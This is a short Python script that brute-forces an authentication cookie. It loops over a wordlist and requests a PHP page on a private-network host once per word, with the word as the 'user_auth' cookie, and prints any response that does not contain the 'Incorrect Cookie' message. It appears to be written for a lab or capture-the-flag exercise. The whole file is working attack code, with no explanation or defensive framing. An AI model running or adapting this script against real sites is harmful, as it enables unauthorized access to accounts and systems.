import requests
lines = []

with open('raft-small-words.txt') as raft:
  lines = raft.readlines()

for i in lines:
  # print(i.replace("\n", ""))
  mycookie = {'user_auth': i.replace("\n", "")}
  response = requests.get('http://172.25.0.29/page1.php', cookies=mycookie)
  #fetch the page with the cookie set and return the response
  if "Incorrect Cookie. Try Again!" not in response.text:
      print(response.text)